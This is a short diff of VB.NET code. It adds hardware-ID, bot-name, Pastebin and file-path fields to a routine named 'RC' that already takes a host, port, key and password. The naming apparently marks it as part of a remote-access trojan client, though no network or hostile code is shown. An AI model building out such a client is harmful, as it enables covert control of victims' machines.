@@ -5,13 +5,17 @@ Public Class Main
 
 
 
-    Public Shared Sub RC(ByVal H As String, ByVal P As Integer, ByVal K As String, ByVal SP As String, ByVal PW As String, ByVal FP As String)
+    Public Shared Sub RC(ByVal H As String, ByVal P As Integer, ByVal K As String, ByVal SP As String, ByVal PW As String, ByVal FP As String, ByVal HW As String, ByVal BT As String, ByVal PB As String)
 
         KEY = K
         HOST = H
         PORT = P
         SPL = SP
         PASS = PW
+        FULLPATH = FP
+        HWID = HW
+        BOT = BT
+        Pastebin = PB
 
         Dim lp As Integer = 0
 
@@ -195,5 +199,9 @@ cc:
     Public Shared SPL As String
     Public Shared PASS As String
     Public Shared M As New IO.MemoryStream
+    Public Shared FULLPATH As String
+    Public Shared HWID As String
+    Public Shared BOT As String
+    Public Shared Pastebin As String
 
 End Class
